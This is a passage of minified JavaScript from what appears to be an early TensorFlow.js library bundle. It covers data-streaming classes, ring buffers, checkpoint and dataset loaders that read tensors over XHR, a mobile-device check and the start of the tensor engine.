this.refill(),this.buffer.shift()},e}(y);n.PrefetchStream=O;var E=function(t){function e(e,n,r){var i=t.call(this,e,n)||this;return i.upstream=e,i.windowSize=n,i.upstreamExhausted=!1,i.random=a(r),i}return i(e,t),e.prototype.randomInt=function(t){return Math.floor(this.random()*t)},e.prototype.chooseIndex=function(){return this.randomInt(this.buffer.length())},e.prototype.next=function(){return o(this,void 0,void 0,(function(){var t,e;return s(this,(function(n){switch(n.label){case 0:this.upstreamExhausted||this.refill(),n.label=1;case 1:return this.buffer.isEmpty()?[3,3]:(t=this.chooseIndex(),[4,this.buffer.shuffleExcise(t)]);case 2:return(e=n.sent()).done?(this.upstreamExhausted=!0,[3,1]):(this.refill(),[2,e]);case 3:return[2,{value:null,done:!0}]}}))}))},e}(O);n.ShuffleStream=E},{"../../../globals":28,"../../../util":143,"../util/growing_ring_buffer":17,"../util/ring_buffer":18,seedrandom:146}],14:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=function(t){function e(e,n){void 0===n&&(n={});var r=t.call(this)||this;return r.file=e,r.options=n,r.offset=n.offset||0,r.chunkSize=n.chunkSize||1048576,r}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){var t,e,n=this;return s(this,(function(r){switch(r.label){case 0:return this.offset>=this.file.size?[2,{value:null,done:!0}]:(t=new Promise((function(t,e){var r=new FileReader;r.onload=function(n){var i=r.result;if(i instanceof ArrayBuffer&&(i=new Uint8Array(i)),!(i instanceof Uint8Array))return e(new TypeError("FileReader returned unknown type."));t(i)},r.onabort=function(t){return e(new Error("Aborted"))},r.onerror=function(t){return e(new Error(t.error))};var i=n.offset+n.chunkSize,o=n.file.slice(n.offset,i);r.readAsArrayBuffer(o),n.offset=i})),e={},[4,t]);case 1:return[2,(e.value=r.sent(),e.done=!1,e)]}}))}))},e}(t("./byte_stream").ByteStream);n.FileReaderStream=a},{"./byte_stream":12}],15:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("./data_stream"),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.prototype.split=function(t){return new c(this,t)},e}(a.DataStream);n.StringStream=u;var c=function(t){function e(e,n){var r=t.call(this)||this;return r.impl=new l(e,n),r}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return[2,this.impl.next()]}))}))},e}(u),l=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.separator=n,r.carryover="",r}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t,e,n,r,i;return s(this,(function(o){switch(o.label){case 0:return[4,this.upstream.next()];case 1:if((t=o.sent()).done)return""===this.carryover?[2,!1]:(this.outputQueue.push(this.carryover),this.carryover="",[2,!0]);for((e=t.value.split(this.separator))[0]=this.carryover+e[0],n=0,r=e.slice(0,-1);n<r.length;n++)i=r[n],this.outputQueue.push(i);return this.carryover=e[e.length-1],[2,!0]}}))}))},e}(a.QueueStream)},{"./data_stream":13}],16:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("./byte_stream"),u=t("./data_stream"),c=t("./filereader_stream"),l=function(t){function e(e,n){void 0===n&&(n={});var r=t.call(this)||this;return r.impl=new h(e,n),r}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return[2,this.impl.next()]}))}))},e}(a.ByteStream);n.URLStream=l;var h=function(t){function e(e,n){void 0===n&&(n={});var r=t.call(this)||this;return r.url=e,r.options=n,r.blobPromise=fetch(e,n).then((function(t){if(t.ok)return t.blob();throw new Error(t.statusText)})),r}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t,e;return s(this,(function(n){switch(n.label){case 0:return null!=this.fileReaderStream?[3,2]:[4,this.blobPromise];case 1:t=n.sent(),this.fileReaderStream=new c.FileReaderStream(t,this.options),n.label=2;case 2:return[4,this.fileReaderStream.next()];case 3:return(e=n.sent()).done?[2,!1]:(this.outputQueue.push(e.value),[2,!0])}}))}))},e}(u.QueueStream)},{"./byte_stream":12,"./data_stream":13,"./filereader_stream":14}],17:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=function(t){function e(){return t.call(this,e.INITIAL_CAPACITY)||this}return i(e,t),e.prototype.isFull=function(){return!1},e.prototype.push=function(e){t.prototype.isFull.call(this)&&this.expand(),t.prototype.push.call(this,e)},e.prototype.unshift=function(e){t.prototype.isFull.call(this)&&this.expand(),t.prototype.unshift.call(this,e)},e.prototype.expand=function(){for(var t=2*this.capacity,e=new Array(t),n=this.length(),r=0;r<n;r++)e[r]=this.get(this.wrap(this.begin+r));this.data=e,this.capacity=t,this.doubledCapacity=2*this.capacity,this.begin=0,this.end=n},e.INITIAL_CAPACITY=32,e}(t("./ring_buffer").RingBuffer);n.GrowingRingBuffer=o},{"./ring_buffer":18}],18:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function t(t){if(this.capacity=t,this.begin=0,this.end=0,t<1)throw new RangeError("Can't create ring buffer of capacity < 1.");this.data=new Array(t),this.doubledCapacity=2*t}return t.prototype.wrap=function(t){for(;t<0;)t+=this.doubledCapacity;return t%this.doubledCapacity},t.prototype.get=function(t){if(t<0)throw new RangeError("Can't get item at a negative index.");return this.data[t%this.capacity]},t.prototype.set=function(t,e){if(t<0)throw new RangeError("Can't set item at a negative index.");this.data[t%this.capacity]=e},t.prototype.length=function(){var t=this.end-this.begin;return t<0&&(t=this.doubledCapacity+t),t},t.prototype.isFull=function(){return this.length()===this.capacity},t.prototype.isEmpty=function(){return 0===this.length()},t.prototype.push=function(t){if(this.isFull())throw new RangeError("Ring buffer is full.");this.set(this.end,t),this.end=this.wrap(this.end+1)},t.prototype.pop=function(){if(this.isEmpty())throw new RangeError("Ring buffer is empty.");this.end=this.wrap(this.end-1);var t=this.get(this.end);return this.set(this.end,void 0),t},t.prototype.unshift=function(t){if(this.isFull())throw new RangeError("Ring buffer is full.");this.begin=this.wrap(this.begin-1),this.set(this.begin,t)},t.prototype.shift=function(){if(this.isEmpty())throw new RangeError("Ring buffer is empty.");var t=this.get(this.begin);return this.set(this.begin,void 0),this.begin=this.wrap(this.begin+1),t},t.prototype.shuffleExcise=function(t){if(this.isEmpty())throw new RangeError("Ring buffer is empty.");var e=this.wrap(this.begin+t),n=this.get(e);return this.set(e,this.pop()),n},t}();n.RingBuffer=r},{}],19:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./data/dataset");n.Dataset=r.Dataset;var i=t("./data/dataset");n.datasetFromElements=i.datasetFromElements;var o=t("./data/datasets/csv_dataset");n.CSVDataset=o.CSVDataset;var s=t("./data/datasets/text_line_dataset");n.TextLineDataset=s.TextLineDataset;var a=t("./data/sources/file_data_source");n.FileDataSource=a.FileDataSource;var u=t("./data/sources/url_data_source");n.URLDataSource=u.URLDataSource},{"./data/dataset":5,"./data/datasets/csv_dataset":6,"./data/datasets/text_line_dataset":7,"./data/sources/file_data_source":9,"./data/sources/url_data_source":10}],20:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../tensor"),i="manifest.json",o=function(){function t(t){this.urlPath=t,"/"!==this.urlPath.charAt(this.urlPath.length-1)&&(this.urlPath+="/")}return t.prototype.loadManifest=function(){var t=this;return new Promise((function(e,n){var r=new XMLHttpRequest;r.open("GET",t.urlPath+i),r.onload=function(){t.checkpointManifest=JSON.parse(r.responseText),e()},r.onerror=function(e){throw new Error("manifest.json not found at "+t.urlPath+". "+e)},r.send()}))},t.prototype.getCheckpointManifest=function(){var t=this;return null==this.checkpointManifest?new Promise((function(e,n){t.loadManifest().then((function(){e(t.checkpointManifest)}))})):new Promise((function(e,n){e(t.checkpointManifest)}))},t.prototype.getAllVariables=function(){var t=this;return null!=this.variables?new Promise((function(e,n){e(t.variables)})):new Promise((function(e,n){t.getCheckpointManifest().then((function(n){for(var r=Object.keys(t.checkpointManifest),i=[],o=0;o<r.length;o++)i.push(t.getVariable(r[o]));Promise.all(i).then((function(n){t.variables={};for(var i=0;i<n.length;i++)t.variables[r[i]]=n[i];e(t.variables)}))}))}))},t.prototype.getVariable=function(t){var e=this;if(!(t in this.checkpointManifest))throw new Error("Cannot load non-existant variable "+t);var n=function(n,i){var o=new XMLHttpRequest;o.responseType="arraybuffer";var s=e.checkpointManifest[t].filename;o.open("GET",e.urlPath+s),o.onload=function(){if(404===o.status)throw new Error("Not found variable "+t);var i=new Float32Array(o.response),s=r.Tensor.make(e.checkpointManifest[t].shape,{values:i});n(s)},o.onerror=function(e){throw new Error("Could not fetch variable "+t+": "+e)},o.send()};return null==this.checkpointManifest?new Promise((function(t,r){e.loadManifest().then((function(){new Promise(n).then(t)}))})):new Promise(n)},t}();n.CheckpointLoader=o},{"../tensor":137}],21:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../tensor"),i=t("../util"),o=function(){function t(t){this.dataShapes=t,this.normalizationInfo={}}return t.prototype.getDataShape=function(t){return this.dataShapes[t]},t.prototype.getData=function(){return this.dataset},t.prototype.getStats=function(){var t=this;if(null==this.dataset)throw new Error("Data is null.");return this.dataset.map((function(e){return t.getStatsForData(e)}))},t.prototype.getStatsForData=function(t){var e=Number.POSITIVE_INFINITY,n=Number.NEGATIVE_INFINITY,r=t.map((function(t,e){return e}));i.shuffle(r),r=r.slice(.1*r.length);for(var o=0;o<r.length;o++)for(var s=t[r[o]].dataSync(),a=0;a<s.length;a++)e=Math.min(e,s[a]),n=Math.max(n,s[a]);return{inputMin:e,inputMax:n,exampleCount:t.length,shape:t[0].shape}},t.prototype.normalizeExamplesToRange=function(t,e,n,o,s){var a=n instanceof Float32Array&&e instanceof Float32Array,u=o instanceof Float32Array&&s instanceof Float32Array,c=i.sizeFromShape(t[0].shape),l=[];return t.forEach((function(t){for(var i=t.dataSync(),h=new Float32Array(c),p=0;p<c;p++){var d=a?e[p]:e,f=(a?n[p]:n)-d,y=u?o[p]:o,m=(u?s[p]:s)-y;h[p]=0===f?y:y+m*(i[p]-d)/f}l.push(r.Tensor.make(t.shape,{values:h},"float32"))})),l},t.prototype.computeBounds=function(t){var e=this;if(null==this.dataset)throw new Error("Data is null.");var n=i.sizeFromShape(this.dataset[t][0].shape);this.normalizationInfo[t]={isNormalized:!1,minValues:new Float32Array(n),maxValues:new Float32Array(n)};for(var r=0;r<n;r++)this.normalizationInfo[t].minValues[r]=Number.POSITIVE_INFINITY,this.normalizationInfo[t].maxValues[r]=Number.NEGATIVE_INFINITY;this.dataset[t].forEach((function(r){for(var i=r.dataSync(),o=0;o<n;o++)e.normalizationInfo[t].minValues[o]=Math.min(e.normalizationInfo[t].minValues[o],i[o]),e.normalizationInfo[t].maxValues[o]=Math.max(e.normalizationInfo[t].maxValues[o],i[o])}))},t.prototype.normalizeWithinBounds=function(t,e,n){if(null==this.dataset)throw new Error("Data is null.");if(t>=this.dataset.length)throw new Error("dataIndex out of bounds.");var r,i;null==this.normalizationInfo[t]&&this.computeBounds(t),this.normalizationInfo[t].isNormalized?(r=this.normalizationInfo[t].lowerBound,i=this.normalizationInfo[t].upperBound):(r=this.normalizationInfo[t].minValues,i=this.normalizationInfo[t].maxValues),this.dataset[t]=this.normalizeExamplesToRange(this.dataset[t],r,i,e,n),this.normalizationInfo[t].isNormalized=!0,this.normalizationInfo[t].lowerBound=e,this.normalizationInfo[t].upperBound=n},t.prototype.isNormalized=function(t){return null!=this.normalizationInfo&&this.normalizationInfo[t].isNormalized},t.prototype.removeNormalization=function(t){if(null==this.dataset)throw new Error("Training or test data is null.");this.isNormalized(t)&&(this.dataset[t]=this.normalizeExamplesToRange(this.dataset[t],this.normalizationInfo[t].lowerBound,this.normalizationInfo[t].upperBound,this.normalizationInfo[t].minValues,this.normalizationInfo[t].maxValues),this.normalizationInfo[t].isNormalized=!1)},t.prototype.unnormalizeExamples=function(t,e){return this.isNormalized(e)?this.normalizeExamplesToRange(t,this.normalizationInfo[e].lowerBound,this.normalizationInfo[e].upperBound,this.normalizationInfo[e].minValues,this.normalizationInfo[e].maxValues):t},t.prototype.dispose=function(){if(null!=this.dataset){for(var t=0;t<this.dataset.length;t++)for(var e=0;e<this.dataset[t].length;e++)this.dataset[t][e].dispose();this.dataset=[]}},t}();n.InMemoryDataset=o},{"../tensor":137,"../util":143}],22:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../util"),s=function(){function t(t){this.inputs=t,this.idx=0,this.inputCounter=0,this.epoch=0,this.shuffledIndices=o.createShuffledIndices(t[0].length),this.numInputs=t.length;for(var e=this.inputs[0].length,n=0;n<this.numInputs;n++)o.assert(this.inputs[n].length===e,"Number of examples must match across different inputs.");for(n=0;n<this.numInputs;n++)for(var r=this.inputs[n][0].shape,i=0;i<this.inputs[n].length;i++)o.assertShapesMatch(r,this.inputs[n][i].shape)}return t.prototype.getCurrentExampleIndex=function(){var t=this.idx;return this.inputCounter++,this.inputCounter>=this.numInputs&&(this.idx++,this.inputCounter=0,this.idx>=this.inputs[0].length&&(this.idx=0,this.epoch++)),t},t.prototype.getNextInput=function(t){var e=this.getCurrentExampleIndex();return this.inputs[t][this.shuffledIndices[e]]},t.prototype.getEpoch=function(){return this.epoch},t.prototype.getInputProviders=function(){for(var t=[],e=0;e<this.numInputs;e++)t.push(this.getInputProvider(e));return t},t}();n.InMemoryShuffledInputProviderBuilder=s;var a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.prototype.getInputProvider=function(t){var e=this;return{getNextCopy:function(){return e.getNextInput(t).clone()},disposeCopy:function(t){t.dispose()}}},e}(s);n.InCPUMemoryShuffledInputProviderBuilder=a;var u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.prototype.getInputProvider=function(t){var e=this;return{getNextCopy:function(){return e.getNextInput(t).clone()},disposeCopy:function(t){t.dispose()}}},e}(s);n.InGPUMemoryShuffledInputProviderBuilder=u},{"../util":143}],23:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../tensor"),s=t("../util"),a=t("./dataset");n.getXhrDatasetConfig=function(t){return new Promise((function(e,n){var r=new XMLHttpRequest;r.open("GET",t),r.onload=function(){e(JSON.parse(r.responseText))},r.onerror=function(t){n(t)},r.send()}))};var u=function(t){function e(e){var n=t.call(this,e.data.map((function(t){return t.shape})))||this;return n.xhrDatasetConfig=e,n}return i(e,t),e.prototype.getTensor=function(t){var e="png"===t.dataType?function(t,e){return new Promise((function(n,r){var i=new Image;i.setAttribute("crossOrigin",""),i.onload=function(){var t=function(t,e){var n=document.createElement("canvas"),r=n.getContext("2d"),i=t.height,o=s.sizeFromShape(e),a=new Uint8Array(i*o);if(t.width!==e[0]*e[1])throw new Error("Image width ("+t.width+") must be multiple of rows*columns ("+e[0]+"*"+e[1]+") of the tensor");n.width=t.width,n.height=1e3;for(var u=0,h=n.width,p=n.height,d=0,f=0,y=h,m=p,v=e[2],g=0,_=Math.ceil(i/n.height),b=0;b<_;++b){var w=b*n.height;b===_-1&&i%n.height>0&&(n.height=i%n.height,m=p=n.height),r.drawImage(t,u,w,h,p,d,f,y,m);var x=r.getImageData(0,0,n.width,n.height).data;1===v?c(x,a,g):l(x,a,g),g+=n.height*o}return a}(i,e);i.src="",i=null,n(t)},i.src=t.path}))}(t,t.shape):function(t){return new Promise((function(e,n){var r=new XMLHttpRequest;r.open("GET",t.path),r.responseType="arraybuffer",r.onload=function(n){var i="float32"===t.dataType?new Float32Array(r.response):new Uint8Array(r.response);e(i)},r.onerror=function(t){return n(t)},r.send()}))}(t),n=s.sizeFromShape(t.shape);return e.then((function(e){for(var r=[],i=0;i<e.length/n;i++){var s=e.subarray(i*n,(i+1)*n),a=o.Tensor.make(t.shape,{values:new Float32Array(s)},"float32");r.push(a)}return r}))},e.prototype.fetchData=function(){var t=this;return new Promise((function(e,n){var r=t.xhrDatasetConfig.data.map((function(e){return t.getTensor(e)}));Promise.all(r).then((function(n){t.dataset=n,e()}))}))},e}(a.InMemoryDataset);function c(t,e,n){for(var r=n,i=0;i<t.length;i+=4)e[r++]=t[i]}function l(t,e,n){for(var r=n,i=0;i<t.length;i+=4)e[r]=t[i],e[r+1]=t[i+1],e[r+2]=t[i+2],r+=3}n.XhrDataset=u},{"../tensor":137,"../util":143,"./dataset":21}],24:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.isMobile=function(){var t=navigator.userAgent||navigator.vendor||window.opera;return/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(t)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0,4))}},{}],25:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.doc=function(t){return function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]}}},{}],26:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("./environment"),s=t("./globals"),a=t("./ops/ops"),u=t("./profiler"),c=t("./tape"),l=t("./tensor"),h=t("./util"),p=function(){function t(t,e,n){this.backend=t,this.customBackend=e,this.safeMode=n,this.registeredVariables={},this.refCounter=new WeakMap,this.nextTapeNodeId=0,this.numBytes=0,this.numTensors=0,this.numDataBuffers=0,this.gradientScopeCount=0,this.customGradientDepth=0,this.activeScope={keep:[],track:[]},this.scopeStack=[this.activeScope],this.profiler=new u.Profiler(t)}return t.prototype.runKernel=function(t,e,n){var r,i=this,s=[],a=function(t){return s.push(t),t},u=this.activeScope.name;if(r=o.ENV.get("DEBUG")?this.profiler.profileKernel(u,(function(){return t(i.backend,a)})):t(this.backend,a),null!=this.activeTape&&0===this.customGradientDepth){var c={id:this.nextTapeNodeId++,name:u,inputs:e,output:r};null!=n&&(c.gradient=function(t){return n(t,s)}),this.activeTape.push(c)}return r},t.prototype.registerTensor=function(t){var e=this.refCounter.has(t.dataId)?this.refCounter.get(t.dataId):0;this.numTensors++,0===e&&(this.numDataBuffers++,this.numBytes+=h.sizeFromShape(t.shape)*h.bytesPerElement(t.dtype),this.backend.register(t.dataId,t.shape,t.dtype)),this.refCounter.set(t.dataId,e+1),t instanceof l.Variable||this.track(t)},t.prototype.registerVariable=function(t){if(null!=this.registeredVariables[t.name])throw new Error("Variable with name "+t.name+" was already registered");this.registeredVariables[t.name]=t},t.prototype.disposeTensor=function(t){if(this.refCounter.has(t.dataId)){this.numTensors--;var 